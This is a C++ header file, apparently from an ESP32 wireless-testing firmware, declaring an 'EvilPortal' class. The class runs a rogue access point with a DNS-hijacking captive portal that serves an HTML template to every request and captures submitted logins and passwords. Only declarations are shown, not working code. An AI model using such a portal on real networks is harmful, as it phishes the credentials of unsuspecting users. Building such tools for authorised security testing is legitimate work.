#pragma once

#ifndef EvilPortal_h
#define EvilPortal_h

#include "ESPAsyncWebServer.h"
#include <AsyncTCP.h>
#include <DNSServer.h>
#include <WiFi.h>

#include "configs.h"
#include "settings.h"
#ifdef HAS_SCREEN
  #include "Display.h"
  #include <LinkedList.h>
#endif
#include "SDInterface.h"
#include "Buffer.h"
#include "lang_var.h"

extern Settings settings_obj;
extern SDInterface sd_obj;
#ifdef HAS_SCREEN
  extern Display display_obj;
#endif
extern Buffer buffer_obj; 

#define WAITING 0
#define GOOD 1
#define BAD 2

#define SET_HTML_CMD "sethtml="
#define SET_AP_CMD   "setap="
#define RESET_CMD    "reset"
#define START_CMD    "start"
#define ACK_CMD      "ack"

#define MAX_AP_NAME_SIZE       32
#define WIFI_SCAN_EVIL_PORTAL  30

// Global AP name buffer
char apName[MAX_AP_NAME_SIZE] = "PORTAL";

// Legacy HTML pointer used by CaptiveRequestHandler.
// The real HTML is stored in EvilPortal::html_template,
// and index_html is set as an alias to html_template.c_str().
extern char* index_html;

struct ssid {
  String essid;
  uint8_t channel;
  uint8_t bssid[6];
  bool selected;
};

struct AccessPoint {
  String essid;
  uint8_t channel;
  uint8_t bssid[6];
  bool selected;
  // LinkedList<char>* beacon;
  char beacon[2];
  int8_t rssi;
  LinkedList<uint16_t>* stations;
  uint16_t packets;
  uint8_t sec;
  bool wps;
  String man;
};

class CaptiveRequestHandler : public AsyncWebHandler {
public:
  CaptiveRequestHandler() {}
  virtual ~CaptiveRequestHandler() {}

  bool canHandle(AsyncWebServerRequest *request) override {
    return true;
  }

  void handleRequest(AsyncWebServerRequest *request) override {
    // index_html points to EvilPortal::html_template.c_str()
    request->send(200, "text/html", index_html);
  }
};

class EvilPortal {

  private:
    bool runServer;
    bool login_received;
    bool password_received;

    String login;
    String password;

    bool   has_html;
    String html_template;          // stores the raw HTML template

    bool          client_connected;   // Wi-Fi client presence tracking
    unsigned long lastStationPollMs;  // last time station list was polled

    DNSServer dnsServer;

    void (*resetFunction)(void) = 0;

    bool setHtml();
    bool setAP(LinkedList<ssid>* ssids, LinkedList<AccessPoint>* access_points);
    void setupServer();
    void startPortal();
    void startAP();
    void sendToDisplay(String msg);
    void pollStationConnections();

  public:
    EvilPortal();

    String renderPage();

    int ap_index = -1;

    String  target_html_name     = "index.html";
    uint8_t selected_html_index  = 0;

    bool using_serial_html;
    bool has_ap;

    LinkedList<String>* html_files;

    void   cleanup();
    String get_login();
    String get_password();
    bool   setAP(String essid);
    void   setup();
    bool   begin(LinkedList<ssid>* ssids, LinkedList<AccessPoint>* access_points);
    void   main(uint8_t scan_mode);
    void   setHtmlFromSerial();
};

#endif